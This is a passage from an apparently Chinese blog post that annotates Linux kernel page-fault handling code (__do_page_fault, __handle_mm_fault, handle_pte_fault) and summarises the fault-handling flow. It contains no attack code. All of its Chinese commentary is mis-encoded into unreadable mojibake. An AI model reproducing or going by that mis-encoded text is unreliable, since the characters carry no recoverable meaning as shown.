fixup a prefetch</span><br><span class="hljs-comment">		 * fault we could otherwise deadlock:</span><br><span class="hljs-comment">		 */</span><br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">/*å‘ç”Ÿäº†ä¸€ä¸ªä¸å¯æ¢å¤çš„é¡µé¢æ•…éšœï¼Œç›´æ¥kill*/</span><br><br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br>	<span class="hljs-keyword">if</span> (unlikely(kprobes_fault(regs)))<br>		<span class="hljs-keyword">return</span>;<br><br>	<span class="hljs-keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<br>		pgtable_bad(regs, error_code, address);<br><br>	<span class="hljs-keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="hljs-comment">/*smapï¼Œç›´æ¥gg*/</span><br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we&#x27;re in an interrupt, have no user context or are running</span><br><span class="hljs-comment">	 * in a region with pagefaults disabled then we must not take the fault</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<br>		bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span><br><span class="hljs-comment">	 * vmalloc fault has been handled.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * User-mode registers count as a user access even for any</span><br><span class="hljs-comment">	 * potential system fault or CPU buglet:</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (user_mode(regs)) &#123; <span class="hljs-comment">/*ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶çš„å¯„å­˜å™¨çŠ¶æ€ä¸ºç”¨æˆ·æ€ä¸‹çš„*/</span><br>		local_irq_enable();<br>		error_code |= PF_USER;<br>		flags |= FAULT_FLAG_USER;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)<br>			local_irq_enable();<br>	&#125;<br><br>	perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="hljs-number">1</span>, regs, address);<br><br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_WRITE)<br>		flags |= FAULT_FLAG_WRITE;<br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_INSTR)<br>		flags |= FAULT_FLAG_INSTRUCTION;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When running in the kernel we expect faults to occur only to</span><br><span class="hljs-comment">	 * addresses in user space.  All other faults represent errors in</span><br><span class="hljs-comment">	 * the kernel and should generate an OOPS.  Unfortunately, in the</span><br><span class="hljs-comment">	 * case of an erroneous fault occurring in a code path which already</span><br><span class="hljs-comment">	 * holds mmap_sem we will deadlock attempting to validate the fault</span><br><span class="hljs-comment">	 * against the address space.  Luckily the kernel only validly</span><br><span class="hljs-comment">	 * references user space from well defined areas of code, which are</span><br><span class="hljs-comment">	 * listed in the exceptions table.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * As the vast majority of faults will be valid we will only perform</span><br><span class="hljs-comment">	 * the source reference check when there is a possibility of a</span><br><span class="hljs-comment">	 * deadlock. Attempt to lock the address space, if we cannot we then</span><br><span class="hljs-comment">	 * validate the source. If this is invalid we can skip the address</span><br><span class="hljs-comment">	 * space check, thus avoiding the deadlock:</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<br>		<span class="hljs-keyword">if</span> ((error_code &amp; PF_USER) == <span class="hljs-number">0</span> &amp;&amp;<br>		    !search_exception_tables(regs-&gt;ip)) &#123;<br>			bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>retry:<br>		down_read(&amp;mm-&gt;mmap_sem);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The above down_read_trylock() might have succeeded in</span><br><span class="hljs-comment">		 * which case we&#x27;ll have missed the might_sleep() from</span><br><span class="hljs-comment">		 * down_read():</span><br><span class="hljs-comment">		 */</span><br>		might_sleep();<br>	&#125;<br><br>	vma = find_vma(mm, address);<br>	<span class="hljs-keyword">if</span> (unlikely(!vma)) &#123;<br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="hljs-comment">/*æ£€æŸ¥è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ˜¯å¦åœ¨å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„åŒºåŸŸå†…*/</span><br>		<span class="hljs-keyword">goto</span> good_area;<br>	<span class="hljs-keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="hljs-comment">/*ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·ç©ºé—´*/</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Accessing the stack below %sp is always a bug.</span><br><span class="hljs-comment">		 * The large cushion allows instructions like enter</span><br><span class="hljs-comment">		 * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span><br><span class="hljs-comment">		 * 32 pointers and then decrements %sp by 65535.)</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (unlikely(address + <span class="hljs-number">65536</span> + <span class="hljs-number">32</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) &lt; regs-&gt;sp)) &#123;<br>			bad_area(regs, error_code, address);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="hljs-comment">/*è°ƒç”¨ expand_stack() å‡½æ•°å°è¯•æ‰©å±•æ ˆåŒº*/</span><br>		bad_area(regs, error_code, address);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Ok, we have a good vm_area for this memory access, so</span><br><span class="hljs-comment">	 * we can handle it..</span><br><span class="hljs-comment">	 */</span><br><span class="hljs-comment">/*è¿è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜æ˜¯æ­£å¸¸çš„ç¼ºé¡µå¼‚å¸¸ï¼Œaddrå±äºè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæ­¤æ—¶è¿›è¡Œè¯·æ±‚è°ƒé¡µï¼Œåˆ†é…ç‰©ç†å†…å­˜*/</span><br>good_area:<br>	<span class="hljs-keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<br>		bad_area_access_error(regs, error_code, address, vma);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If for any reason at all we couldn&#x27;t handle the fault,</span><br><span class="hljs-comment">	 * make sure we exit gracefully rather than endlessly redo</span><br><span class="hljs-comment">	 * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span><br><span class="hljs-comment">	 * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">/*æ ¸å¿ƒfunction*/</span><br>	fault = handle_mm_fault(vma, address, flags);<br>	major |= fault &amp; VM_FAULT_MAJOR;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we need to retry the mmap_sem has already been released,</span><br><span class="hljs-comment">	 * and if there is a fatal signal pending there is no guarantee</span><br><span class="hljs-comment">	 * that we made any progress. Handle this case first.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<br>		<span class="hljs-comment">/* Retry at most once */</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;<br>			flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<br>			flags |= FAULT_FLAG_TRIED;<br>			<span class="hljs-keyword">if</span> (!fatal_signal_pending(tsk))<br>				<span class="hljs-keyword">goto</span> retry;<br>		&#125;<br><br>		<span class="hljs-comment">/* User mode? Just return to handle the fatal exception */</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="hljs-comment">/*ç”¨æˆ·æ€è§¦å‘ç”¨æˆ·åœ°å€ç©ºé—´ç¼ºé¡µå¼‚å¸¸ï¼Œäº¤ç”±ä¸Šå±‚å‡½æ•°å¤„ç†äº†*/</span><br>			<span class="hljs-keyword">return</span>;<br><br>		<span class="hljs-comment">/* Not returning to user mode? Handle exceptions or die: */</span><br>		no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	up_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">/*é‡Šæ”¾å†…å­˜ç®¡ç†ç»“æ„çš„è¯»é”*/</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;<br>		mm_fault_error(regs, error_code, address, vma, fault);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Major/minor page fault accounting. If any of the events</span><br><span class="hljs-comment">	 * returned VM_FAULT_MAJOR, we account it as a major fault.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (major) &#123;<span class="hljs-comment">/*å¦‚æœé¡µé¢æ•…éšœè¢«æ ‡è®°ä¸º Majorï¼Œåˆ™å¢åŠ ä»»åŠ¡çš„ maj_flt è®¡æ•°å™¨ï¼›å¦åˆ™ï¼Œå¢åŠ  min_flt è®¡æ•°å™¨*/</span><br>		tsk-&gt;maj_flt++;<br>		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="hljs-number">1</span>, regs, address);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		tsk-&gt;min_flt++;<br>		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="hljs-number">1</span>, regs, address);<span class="hljs-comment">/*è®°å½•é¡µé¢æ•…éšœäº‹ä»¶ï¼Œç”¨äºæ€§èƒ½ç»Ÿè®¡*/</span><br>	&#125;<br><br>	check_v8086_mode(regs, address, tsk);<br>&#125;<br>NOKPROBE_SYMBOL(__do_page_fault);<br></code></pre></td></tr></table></figure>

<p>A3ğŸ‘´æ€»ç»“çš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·åœ°å€ç©ºé—´è¿˜æ˜¯å†…æ ¸åœ°å€ç©ºé—´</li>
<li>ä½äºå†…æ ¸åœ°å€ç©ºé—´<ul>
<li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œ<code>vmalloc_fault()</code> å¤„ç†</li>
<li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ®µé”™è¯¯ï¼Œå‘é€<code>SIGSEGV</code>ä¿¡å·</li>
</ul>
</li>
<li>ä½äºç”¨æˆ·åœ°å€ç©ºé—´<ul>
<li>å†…æ ¸æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul>
<li><code>SMAP</code>ä¿æŠ¤å·²å¼€å¯ï¼Œç»ˆæ­¢è¿›ç¨‹</li>
<li>è¿›ç¨‹æ— åœ°å€ç©ºé—´ | è®¾ç½®äº†ä¸å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œç»ˆæ­¢è¿›ç¨‹</li>
<li>è¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
</ul>
</li>
<li>ç”¨æˆ·æ€è§¦å‘ç¼ºé¡µå¼‚å¸¸<ul>
<li>è®¾ç½®å¯¹åº”æ ‡å¿—ä½ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
</ul>
</li>
<li>æ£€æŸ¥æ˜¯å¦æ˜¯å†™é¡µå¼‚å¸¸ï¼Œå¯èƒ½æ˜¯é¡µä¸å­˜åœ¨&#x2F;æ— æƒé™å†™ï¼Œè®¾ç½®å¯¹åº”æ ‡å¿—ä½</li>
<li>æ‰¾å¯»çº¿æ€§åœ°å€æ‰€å±çš„çº¿æ€§åŒºï¼ˆ<strong>vma</strong>ï¼‰[1]<ul>
<li>ä¸å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œéæ³•è®¿é—®</li>
<li>å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œä¸”ä½äº<code>vma</code>æ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥æµç¨‹</li>
<li>å­˜åœ¨å¯¹åº”<code>vma</code>ï¼Œä¸ä½äº<code>vma</code>æ‰€æè¿°åŒºåŸŸä¸­ï¼Œè¯´æ˜å¯èƒ½æ˜¯ä½äºå †æ ˆï¼ˆ<strong>stack</strong>ï¼‰ï¼Œå°è¯•å¢é•¿å †æ ˆ</li>
</ul>
</li>
<li>âœ³è°ƒç”¨<code>handle_mm_fault()</code>å‡½æ•°å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„æ ¸å¿ƒå‡½æ•°<ul>
<li>å¤±è´¥äº†ï¼Œè¿›è¡Œé‡è¯•ï¼ˆè¿”å›åˆ°[1]ï¼Œåªä¼šé‡è¯•ä¸€æ¬¡ï¼‰</li>
<li>å…¶ä»–æ”¶å°¾å¤„ç†</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="__handle_mm_fault"></a>__handle_mm_fault</h4><p><del>æ€»8ä¼šæœ‰äººè¿4çº§é¡µè¡¨è¿˜ä¸çŸ¥é“å§</del></p>
<p>åœ¨<code>Linux</code>ä¸­ï¼Œè™šæ‹Ÿå†…å­˜ç®¡ç†é‡‡ç”¨äº†å¤šçº§é¡µè¡¨çš„æ–¹å¼æ¥å®ç°ã€‚åœ¨x86æ¶æ„ä¸‹ï¼Œ<code>Linux</code>ä½¿ç”¨äº†4çº§é¡µè¡¨ï¼ˆ<strong>4-level paging</strong>ï¼‰ï¼Œä¹Ÿç§°ä¸ºå¤šçº§é¡µè¡¨ï¼ˆ<strong>multilevel paging</strong>ï¼‰æˆ–è€…åˆ†å±‚é¡µè¡¨ï¼ˆ<strong>hierarchical paging</strong>ï¼‰ã€‚</p>
<p>4çº§é¡µè¡¨æ˜¯æŒ‡ç”±å››ä¸ªçº§åˆ«çš„é¡µè¡¨ç»„æˆçš„å±‚æ¬¡ç»“æ„ï¼Œæ¯ä¸ªçº§åˆ«çš„é¡µè¡¨è´Ÿè´£å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€çš„ä¸åŒéƒ¨åˆ†ã€‚è¿™äº›çº§åˆ«ä¾æ¬¡ä¸ºï¼š</p>
<ol>
<li><strong>é¡µå…¨å±€ç›®å½•è¡¨ï¼ˆPage Global Directoryï¼ŒPGDï¼‰</strong>ï¼šç¬¬ä¸€çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µä¸Šçº§ç›®å½•è¡¨ï¼ˆ<strong>Page Upper Directoryï¼ŒPUD</strong>ï¼‰çš„ç´¢å¼•ã€‚</li>
<li><strong>é¡µä¸Šçº§ç›®å½•è¡¨ï¼ˆPage Upper Directoryï¼ŒPUDï¼‰</strong>ï¼šç¬¬äºŒçº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µä¸­é—´ç›®å½•è¡¨ï¼ˆ<strong>Page Middle Directoryï¼ŒPMD</strong>ï¼‰çš„ç´¢å¼•ã€‚</li>
<li><strong>é¡µä¸­é—´ç›®å½•è¡¨ï¼ˆPage Middle Directoryï¼ŒPMDï¼‰</strong>ï¼šç¬¬ä¸‰çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºé¡µè¡¨ï¼ˆ<strong>Page Tableï¼ŒPT</strong>ï¼‰çš„ç´¢å¼•ã€‚</li>
<li><strong>é¡µè¡¨ï¼ˆPage Tableï¼ŒPTEï¼‰</strong>ï¼šç¬¬å››çº§é¡µè¡¨ï¼Œç”¨äºå°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚</li>
</ol>
<p>å†è¦è®¤è¯†ä¸€ä¸ªç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span>	<span class="hljs-comment">/* Target VMA */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address;		<span class="hljs-comment">/* Faulting virtual address */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;		<span class="hljs-comment">/* FAULT_FLAG_xxx flags */</span><br>	<span class="hljs-type">pmd_t</span> *pmd;			<span class="hljs-comment">/* Pointer to pmd entry matching</span><br><span class="hljs-comment">					 * the &#x27;address&#x27;</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">pte_t</span> *pte;			<span class="hljs-comment">/* Pointer to pte entry matching</span><br><span class="hljs-comment">					 * the &#x27;address&#x27;. NULL if the page</span><br><span class="hljs-comment">					 * table hasn&#x27;t been allocated.</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;		<span class="hljs-comment">/* Page table lock.</span><br><span class="hljs-comment">					 * Protects pte page table if &#x27;pte&#x27;</span><br><span class="hljs-comment">					 * is not NULL, otherwise pmd.</span><br><span class="hljs-comment">					 */</span><br>	<span class="hljs-type">pgtable_t</span> prealloc_pte;		<span class="hljs-comment">/* Pre-allocated pte page table.</span><br><span class="hljs-comment">					 * vm_ops-&gt;map_pages() calls</span><br><span class="hljs-comment">					 * alloc_set_pte() from atomic context.</span><br><span class="hljs-comment">					 * do_fault_around() pre-allocates</span><br><span class="hljs-comment">					 * page table to avoid allocation from</span><br><span class="hljs-comment">					 * atomic context.</span><br><span class="hljs-comment">					 */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> <span class="hljs-title">fe</span> =</span> &#123;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª fault_env ç»“æ„ä½“ feï¼Œå…¶ä¸­åŒ…å«äº† vmaã€address å’Œ flags ç­‰ä¿¡æ¯</span><br>		.vma = vma,<br>		.address = address,<br>		.flags = flags,<br>	&#125;;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//é¡µå…¨å±€ç›®å½•é¡¹</span><br>	<span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//é¡µä¸Šçº§ç›®å½•é¡¹</span><br><br>	pgd = pgd_offset(mm, address);<span class="hljs-comment">//è·å–å…¨å±€é¡µè¡¨é¡¹</span><br>	pud = pud_alloc(mm, pgd, address);<span class="hljs-comment">//è·å–é¡µä¸Šçº§ç›®å½•é¡¹</span><br>	<span class="hljs-keyword">if</span> (!pud)<span class="hljs-comment">//è·å–é¡µä¸Šçº§ç›®å½•é¡¹å¤±è´¥ï¼Œgg</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	fe.pmd = pmd_alloc(mm, pud, address);<span class="hljs-comment">//è·å–é¡µä¸­çº§ç›®å½•é¡¹</span><br>	<span class="hljs-keyword">if</span> (!fe.pmd)<span class="hljs-comment">//è·å–é¡µä¸­çº§ç›®å½•é¡¹å¤±è´¥ï¼Œgg</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	<span class="hljs-keyword">if</span> (pmd_none(*fe.pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<span class="hljs-comment">/*é¡µé¢çš„é¡µè¡¨é¡¹ä¸ºç©ºä¸”é€æ˜å¤§é¡µå·²å¯ç”¨ï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨ create_huge_pmd å‡½æ•°å°è¯•åˆ›å»ºä¸€ä¸ªå¤§é¡µã€‚è¿™ä¸ªå‡½æ•°çš„ç›®çš„æ˜¯å°è¯•å°†å¤šä¸ªç‰©ç†é¡µæ˜ å°„åˆ°ä¸€ä¸ªå¤§é¡µä¸Šï¼Œä»è€Œæé«˜å†…å­˜è®¿é—®æ•ˆç‡ã€‚8æ‡‚ï¼Œchatçš„*/</span><br>		<span class="hljs-type">int</span> ret = create_huge_pmd(&amp;fe);<br>		<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="hljs-comment">/*gg*/</span><br>			<span class="hljs-keyword">return</span> ret;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-type">pmd_t</span> orig_pmd = *fe.pmd;<br>		<span class="hljs-type">int</span> ret;<br><br>		barrier();<br>		<span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd) || pmd_devmap(orig_pmd)) &#123;<br>			<span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd) &amp;&amp; vma_is_accessible(vma))<br>				<span class="hljs-keyword">return</span> do_huge_pmd_numa_page(&amp;fe, orig_pmd);<br><br>			<span class="hljs-keyword">if</span> ((fe.flags &amp; FAULT_FLAG_WRITE) &amp;&amp;<br>					!pmd_write(orig_pmd)) &#123;<br>				ret = wp_huge_pmd(&amp;fe, orig_pmd);<br>				<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br>					<span class="hljs-keyword">return</span> ret;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				huge_pmd_set_accessed(&amp;fe, orig_pmd);<br>				<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> handle_pte_fault(&amp;fe);<span class="hljs-comment">//è¿›å…¥æ ¸å¿ƒå¤„ç†å‡½æ•°</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * These routines also need to handle stuff like marking pages dirty</span><br><span class="hljs-comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span><br><span class="hljs-comment"> * RISC architectures).  The early dirtying is also good on the i386.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span><br><span class="hljs-comment"> * with external mmu caches can use to update those (ie the Sparc or</span><br><span class="hljs-comment"> * PowerPC hashed page tables that act as extended TLBs).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes, but allow</span><br><span class="hljs-comment"> * concurrent faults).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The mmap_sem may have been released depending on flags and our return value.</span><br><span class="hljs-comment"> * See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br>	<span class="hljs-type">pte_t</span> entry;<br><br>	<span class="hljs-keyword">if</span> (unlikely(pmd_none(*fe-&gt;pmd))) &#123;<span class="hljs-comment">//é¡µè¡¨æŒ‡é’ˆä¸ºç©ºï¼Œè¡¨ç¤ºç›¸åº”çš„é¡µè¡¨é¡¹è¿˜æœªåˆ†é…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°† fe-&gt;pte è®¾ä¸º NULL</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Leave __pte_alloc() until later: because vm_ops-&gt;fault may</span><br><span class="hljs-comment">		 * want to allocate huge page, and if we expose page table</span><br><span class="hljs-comment">		 * for an instant, it will be difficult to retract from</span><br><span class="hljs-comment">		 * concurrent faults and from rmap lookups.</span><br><span class="hljs-comment">		 */</span><br>		fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/* See comment in 